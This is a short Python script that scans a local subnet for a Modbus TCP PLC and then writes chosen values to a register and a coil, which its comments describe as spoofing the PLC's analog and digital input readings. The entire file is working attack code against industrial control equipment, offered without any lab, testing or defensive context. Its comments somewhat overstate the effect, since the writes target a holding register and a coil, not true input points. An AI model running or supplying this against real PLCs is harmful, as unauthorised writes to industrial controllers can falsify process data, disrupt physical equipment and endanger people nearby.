import socket
import struct
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException

# Function to discover the PLC's IP address
def discover_plc_ip(subnet):
    print("Discovering PLC IP address...")
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        try:
            # Attempt to connect to the Modbus server
            client = ModbusTcpClient(ip)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except ConnectionException:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to spoof reporting messages
def spoof_reporting_messages(plc_ip):
    print("Connecting to PLC...")
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("Failed to connect to PLC.")
        return

    try:
        # Example: Spoof the value of an analog input to 500 (0-1000 range)
        address = 0  # Address of the analog input %IW0.0
        value = 500  # Value to spoof
        client.write_register(address, value)
        print(f"Analog input %IW0.0 spoofed to {value}")

        # Example: Spoof the value of a digital input to 1 (ON)
        address = 0  # Address of the digital input %I0.0
        value = 1  # Value to spoof
        client.write_coil(address, value)
        print(f"Digital input %I0.0 spoofed to {value}")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

# Main function
def main():
    subnet = "192.168.9"  # Subnet to scan for the PLC
    plc_ip = discover_plc_ip(subnet)
    if plc_ip:
        spoof_reporting_messages(plc_ip)

if __name__ == "__main__":
    main()